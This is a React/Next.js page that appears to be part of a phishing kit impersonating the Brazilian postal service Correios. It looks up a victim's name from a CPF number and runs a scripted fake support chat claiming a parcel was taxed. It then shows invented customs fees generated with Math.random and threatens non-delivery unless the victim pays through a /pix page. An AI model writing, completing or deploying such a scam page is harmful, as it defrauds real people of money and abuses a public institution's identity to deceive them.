"use client"

import {
  Menu,
  ExternalLink,
  FileText,
  Phone,
  ShoppingCart,
  HelpCircle,
  Users,
  Building,
  GraduationCap,
  Search,
  Lock,
  Shield,
  CheckCircle2,
} from "lucide-react"
import { useEffect, useState, useRef } from "react"
import { useSearchParams, useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"

interface Message {
  id: number
  type: "text" | "image" | "audio" | "button" | "typing" | "icon"
  content?: string
  src?: string
  buttonText?: string
  iconType?: "check" | "clara"
  onClick?: () => void
}

interface CPFData {
  nome?: string
  cpf?: string
  nascimento?: string
  sexo?: string
  nome_mae?: string
}

export default function AtendimentoPage() {
  const [isMounted, setIsMounted] = useState(false)
  const [messages, setMessages] = useState<Message[]>([])
  const [currentStep, setCurrentStep] = useState(0)
  const [cpfData, setCpfData] = useState<CPFData | null>(null)
  const [isTyping, setIsTyping] = useState(false)
  const searchParams = useSearchParams()
  const cpfParam = searchParams.get("cpf")
  const router = useRouter()
  const chatContainerRef = useRef<HTMLDivElement>(null)
  const audioRef1 = useRef<HTMLAudioElement>(null)
  const audioRef2 = useRef<HTMLAudioElement>(null)

  // Generate dates
  const today = new Date()
  const tomorrow = new Date(today)
  tomorrow.setDate(tomorrow.getDate() + 1)
  
  const formatDate = (date: Date) => {
    return date.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit", year: "numeric" })
  }

  const dataHoje = formatDate(today)
  const dataAmanha = formatDate(tomorrow)

  // Generate random values for taxes
  const taxaLiberacao = (Math.random() * 10 + 25).toFixed(2)
  const pesoMercadoria = (Math.random() * 15 + 20).toFixed(2)
  const despachoPostal = (Math.random() * 5 + 12).toFixed(2)
  const totalPagar = (parseFloat(taxaLiberacao) + parseFloat(pesoMercadoria) + parseFloat(despachoPostal)).toFixed(2)

  useEffect(() => {
    setIsMounted(true)
    
    // Load CPF data from localStorage
    const storedData = localStorage.getItem("cpfData")
    if (storedData) {
      setCpfData(JSON.parse(storedData))
    }
  }, [])

  useEffect(() => {
    // Fetch CPF data if we have cpfParam
    if (cpfParam && isMounted) {
      fetch(`/api/cpf?cpf=${cpfParam}`)
        .then(res => res.json())
        .then(data => {
          if (data.nome) {
            setCpfData(data)
            localStorage.setItem("cpfData", JSON.stringify(data))
          }
        })
        .catch(console.error)
    }
  }, [cpfParam, isMounted])

  // Auto scroll to bottom
  useEffect(() => {
    if (chatContainerRef.current) {
      chatContainerRef.current.scrollTop = chatContainerRef.current.scrollHeight
    }
  }, [messages])

  const addMessage = (message: Omit<Message, "id">) => {
    setMessages(prev => [...prev, { ...message, id: Date.now() + Math.random() }])
  }

  const removeTyping = () => {
    setMessages(prev => prev.filter(m => m.type !== "typing"))
    setIsTyping(false)
  }

  const showTyping = () => {
    setIsTyping(true)
    addMessage({ type: "typing" })
  }

  const nome = cpfData?.nome || "Cliente"
  const primeiroNome = nome.split(" ")[0]

  // Chat flow
  useEffect(() => {
    if (!isMounted || !cpfData) return

    const runFlow = async () => {
      // Step 1: Clara entrou no chat
      await new Promise(r => setTimeout(r, 500))
      addMessage({ type: "icon", iconType: "clara", content: "Clara entrou no chat" })
      
      // Wait 1s
      await new Promise(r => setTimeout(r, 1000))
      
      // Olá nome!
      showTyping()
      await new Promise(r => setTimeout(r, 1500))
      removeTyping()
      addMessage({ type: "text", content: `Olá <strong>${primeiroNome}</strong>!<br/>Bem-vindo(a) ao atendimento <strong>Virtual dos Correios</strong>.` })
      
      // Wait 2s
      await new Promise(r => setTimeout(r, 2000))
      
      // Image 1
      showTyping()
      await new Promise(r => setTimeout(r, 1000))
      removeTyping()
      addMessage({ type: "image", src: "https://s3.typebot.io/public/workspaces/cm8i23eay00114v61898adhxw/typebots/eoiqn7v6na2t89kp6zr49gys/blocks/r1nu036559bmzeft4wkbpyrn?v=1744289732916" })
      
      // Identificamos...
      await new Promise(r => setTimeout(r, 1500))
      showTyping()
      await new Promise(r => setTimeout(r, 2000))
      removeTyping()
      addMessage({ type: "text", content: "Identificamos Aqui no Sistema que uma de suas Encomendas Foi Taxada" })
      
      // Wait 2s
      await new Promise(r => setTimeout(r, 2000))
      
      // Checkmark
      addMessage({ type: "icon", iconType: "check" })
      
      // nome, você deseja solicitar...
      await new Promise(r => setTimeout(r, 1500))
      showTyping()
      await new Promise(r => setTimeout(r, 2000))
      removeTyping()
      addMessage({ type: "text", content: `<strong>${primeiroNome}</strong>, você deseja solicitar a liberação da sua mercadoria?` })
      
      // Button SIM
      await new Promise(r => setTimeout(r, 500))
      setCurrentStep(1)
    }

    runFlow()
  }, [isMounted, cpfData])

  const handleSimClick = async () => {
    setCurrentStep(0)
    
    // Remove button by advancing
    addMessage({ type: "text", content: "SIM" })
    
    // Wait 1s
    await new Promise(r => setTimeout(r, 1000))
    
    // Audio 1
    addMessage({ type: "audio", src: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/audio%201-wPA0qWBeZTSEDaUj2KjfpCBkUrI8Od.mp3" })
    
    // Wait 12s (for audio)
    await new Promise(r => setTimeout(r, 3000))
    
    // Image 2 with dates
    showTyping()
    await new Promise(r => setTimeout(r, 1500))
    removeTyping()
    addMessage({ type: "image", src: `https://img1.niftyimages.com/911h/-wd7/a0np?data_amanha=${dataAmanha}&data_hoje=${dataHoje}` })
    
    // Por que essa taxa?
    await new Promise(r => setTimeout(r, 2000))
    showTyping()
    await new Promise(r => setTimeout(r, 2500))
    removeTyping()
    addMessage({ 
      type: "text", 
      content: `<strong>Por que essa taxa?</strong><br/>A taxa cobre os custos de liberação alfandegária e envio da sua encomenda. Ela inclui:<br/><br/><strong>Taxa de liberação:</strong><br/>Cobrança padrão para processos alfandegários.<br/><br/><strong>Peso da mercadoria</strong> – Valor ajustado conforme o peso do item.<br/><br/><strong>Despacho postal</strong> – Serviço de liberação e envio.`
    })
    
    // Wait 4s
    await new Promise(r => setTimeout(r, 4000))
    
    // Audio 2
    addMessage({ type: "audio", src: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/audio%202-btK58TI8V2oGuHzyhEgSX2XcxuWlDC.mp3" })
    
    // Wait 11s (for audio)
    await new Promise(r => setTimeout(r, 3000))
    
    // Entendi button
    setCurrentStep(2)
  }

  const handleEntendiClick = async () => {
    setCurrentStep(0)
    
    addMessage({ type: "text", content: "Entendi, continuar!" })
    
    // Wait 1s
    await new Promise(r => setTimeout(r, 1000))
    
    // Image 3
    showTyping()
    await new Promise(r => setTimeout(r, 1500))
    removeTyping()
    addMessage({ type: "image", src: "https://s3.typebot.io/public/workspaces/cm8i23eay00114v61898adhxw/typebots/qtdiz2xuv8zn2tfsinqjf3a9/blocks/xjalk9817yn390rndw401sap?v=1744290207950" })
    
    // Wait 2s
    await new Promise(r => setTimeout(r, 2000))
    
    // GUIA DE PAGAMENTO
    showTyping()
    await new Promise(r => setTimeout(r, 2000))
    removeTyping()
    addMessage({ 
      type: "text", 
      content: `<strong>GUIA DE PAGAMENTO GERADA COM SUCESSO!</strong><br/><span style="color: #0066cc;">Taxa de Liberação:</span> R$ ${taxaLiberacao}<br/><span style="color: #0066cc;">Peso da mercadoria:</span> R$ ${pesoMercadoria}<br/><span style="color: #0066cc;">Despacho postal:</span> R$ ${despachoPostal}<br/><strong>Total a Pagar: R$ ${totalPagar}</strong><br/><br/>Comprovante gerado com sucesso, caso não efetue o pagamento, a sua mercadoria não chegará até você.`
    })
    
    // Wait 2s
    await new Promise(r => setTimeout(r, 2000))
    
    // ATENCAO
    showTyping()
    await new Promise(r => setTimeout(r, 2000))
    removeTyping()
    addMessage({ 
      type: "text", 
      content: `<strong>ATENÇÃO, ${primeiroNome}</strong><br/>CPF: <span style="background: #ffd700; padding: 2px 6px; border-radius: 4px;">${cpfParam || cpfData?.cpf || "---"}</span><br/><br/>Após a confirmação do pagamento, sua encomenda será liberada amanhã dia <span style="background: #ffd700; padding: 2px 6px; border-radius: 4px;">${dataAmanha}</span><br/><br/>Clique para acessar a guia de pagamento`
    })
    
    // Button ACESSAR GUIA
    await new Promise(r => setTimeout(r, 500))
    setCurrentStep(3)
  }

  const handleAcessarGuia = () => {
    router.push("/pix")
  }

  if (!isMounted) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">Carregando...</div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      {/* Header */}
      <header style={{ backgroundColor: "#f5f3f0" }}>
        <div className="flex items-center justify-between px-4 py-2">
          <div className="flex items-center gap-4">
            <button className="text-blue-600 text-sm">Acessibilidade</button>
          </div>
        </div>

        <div className="h-px bg-white w-full"></div>

        <div className="flex items-center justify-between px-4 py-3">
          <div className="md:hidden flex items-center justify-between w-full">
            <Menu className="w-6 h-6 text-chart-3" />
            <img src="/images/correios-logo.png" alt="Correios" className="h-7" />
            <div className="w-6"></div>
          </div>

          <div className="hidden md:flex items-center gap-4 flex-1">
            <Menu className="w-6 h-6 text-chart-3" />
            <img src="/images/correios-logo.png" alt="Correios" className="h-7" />
          </div>

          <div className="hidden md:flex items-center gap-2">
            <div className="bg-gray-300 mr-3 w-px h-[30px]"></div>
            <img src="/images/login-icon.png" alt="Entrar" className="h-8 w-[41px]" />
            <span className="text-[rgba(0,63,253,1)] font-light">Entrar</span>
          </div>
        </div>

        <div className="bg-yellow-400 w-full h-px"></div>
      </header>

      {/* Chat Container */}
      <main className="flex-1 max-w-2xl mx-auto w-full px-4 py-4 flex flex-col">
        {/* Chat Header */}
        <div className="bg-[#004069] text-white p-4 rounded-t-lg flex items-center gap-3">
          <div className="w-10 h-10 bg-yellow-400 rounded-full flex items-center justify-center">
            <span className="text-[#004069] font-bold text-lg">C</span>
          </div>
          <div>
            <h2 className="font-bold">Atendimento Correios</h2>
            <p className="text-xs text-gray-300">Online agora</p>
          </div>
        </div>

        {/* Messages Container */}
        <div 
          ref={chatContainerRef}
          className="flex-1 bg-[#e5ddd5] p-4 overflow-y-auto space-y-3"
          style={{ minHeight: "400px", maxHeight: "60vh" }}
        >
          {messages.map((msg) => (
            <div key={msg.id} className="animate-in fade-in slide-in-from-bottom-2 duration-300">
              {msg.type === "typing" && (
                <div className="flex justify-start">
                  <div className="bg-white rounded-lg p-3 shadow-sm max-w-[80%]">
                    <div className="flex gap-1">
                      <span className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: "0ms" }}></span>
                      <span className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: "150ms" }}></span>
                      <span className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: "300ms" }}></span>
                    </div>
                  </div>
                </div>
              )}
              
              {msg.type === "icon" && msg.iconType === "clara" && (
                <div className="flex justify-center">
                  <div className="bg-[#004069]/10 text-[#004069] rounded-full px-4 py-2 text-sm flex items-center gap-2">
                    <div className="w-6 h-6 bg-yellow-400 rounded-full flex items-center justify-center">
                      <span className="text-[#004069] font-bold text-xs">C</span>
                    </div>
                    {msg.content}
                  </div>
                </div>
              )}
              
              {msg.type === "icon" && msg.iconType === "check" && (
                <div className="flex justify-start">
                  <div className="bg-green-500 rounded-full p-2">
                    <CheckCircle2 className="w-6 h-6 text-white" />
                  </div>
                </div>
              )}
              
              {msg.type === "text" && !msg.buttonText && (
                <div className={`flex ${msg.content === "SIM" || msg.content === "Entendi, continuar!" ? "justify-end" : "justify-start"}`}>
                  <div 
                    className={`rounded-lg p-3 shadow-sm max-w-[80%] ${
                      msg.content === "SIM" || msg.content === "Entendi, continuar!" 
                        ? "bg-[#dcf8c6]" 
                        : "bg-white"
                    }`}
                  >
                    <p 
                      className="text-sm text-gray-800"
                      dangerouslySetInnerHTML={{ __html: msg.content || "" }}
                    />
                  </div>
                </div>
              )}
              
              {msg.type === "image" && (
                <div className="flex justify-start">
                  <div className="bg-white rounded-lg p-2 shadow-sm max-w-[85%]">
                    <img 
                      src={msg.src} 
                      alt="Imagem" 
                      className="rounded-lg max-w-full h-auto"
                    />
                  </div>
                </div>
              )}
              
              {msg.type === "audio" && (
                <div className="flex justify-start">
                  <div className="bg-white rounded-lg p-3 shadow-sm">
                    <audio controls className="max-w-[250px]">
                      <source src={msg.src} type="audio/mpeg" />
                    </audio>
                  </div>
                </div>
              )}
            </div>
          ))}
          
          {/* Button SIM */}
          {currentStep === 1 && (
            <div className="flex justify-center mt-4 animate-in fade-in duration-300">
              <Button 
                onClick={handleSimClick}
                className="bg-white hover:bg-gray-100 text-[#004069] border border-[#004069] font-bold px-8 py-3"
              >
                SIM
              </Button>
            </div>
          )}
          
          {/* Button Entendi */}
          {currentStep === 2 && (
            <div className="flex justify-center mt-4 animate-in fade-in duration-300">
              <Button 
                onClick={handleEntendiClick}
                className="bg-white hover:bg-gray-100 text-[#004069] border border-[#004069] font-bold px-8 py-3"
              >
                Entendi, continuar!
              </Button>
            </div>
          )}
          
          {/* Button Acessar Guia */}
          {currentStep === 3 && (
            <div className="flex justify-center mt-4 animate-in fade-in duration-300">
              <Button 
                onClick={handleAcessarGuia}
                className="bg-[#004069] hover:bg-[#003050] text-white font-bold px-8 py-4 text-lg"
              >
                ACESSAR GUIA DE PAGAMENTO
              </Button>
            </div>
          )}
        </div>

        {/* Chat Footer */}
        <div className="bg-[#f0f0f0] p-3 rounded-b-lg border-t">
          <p className="text-xs text-gray-500 text-center">
            Atendimento automatizado dos Correios
          </p>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-yellow-400 text-black py-8 mt-auto">
        <div className="max-w-6xl mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <div>
              <h3 className="font-bold mb-4 text-[rgba(0,64,105,1)] text-lg md:text-2xl">Fale Conosco</h3>
              <ul className="space-y-2">
                <li className="flex items-center gap-2">
                  <FileText className="w-4 h-4 text-[rgba(12,63,101,1)]" />
                  <span className="text-[rgba(0,65,104,1)] font-medium text-sm md:text-base">
                    Registro de Manifestações
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <Phone className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Central de Atendimento
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <ShoppingCart className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Soluções para o seu negócio
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <HelpCircle className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Suporte ao cliente com contrato
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <Users className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Ouvidoria</span>
                </li>
                <li className="flex items-center gap-2">
                  <Shield className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Denúncia</span>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="font-bold mb-4 text-lg md:text-2xl text-[rgba(0,64,105,1)]">Sobre os Correios</h3>
              <ul className="space-y-2">
                <li className="flex items-center gap-2">
                  <Building className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Identidade corporativa
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <GraduationCap className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Educação e cultura</span>
                </li>
                <li className="flex items-center gap-2">
                  <FileText className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Código de ética</span>
                </li>
                <li className="flex items-center gap-2">
                  <Search className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Transparência e prestação de contas
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <Lock className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Política de Privacidade e Notas Legais
                  </span>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="font-bold mb-4 text-lg md:text-2xl text-[rgba(0,64,105,1)]">Outros Sites</h3>
              <ul className="space-y-2">
                <li className="flex items-center gap-2 text-[rgba(0,64,105,1)]">
                  <ExternalLink className="w-4 h-4" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Loja online dos Correios
                  </span>
                </li>
              </ul>
            </div>
          </div>

          <div className="text-center mt-8 pt-4 border-t border-yellow-500">
            <p className="text-sm">© Copyright 2025 Correios</p>
          </div>
        </div>
      </footer>
    </div>
  )
}
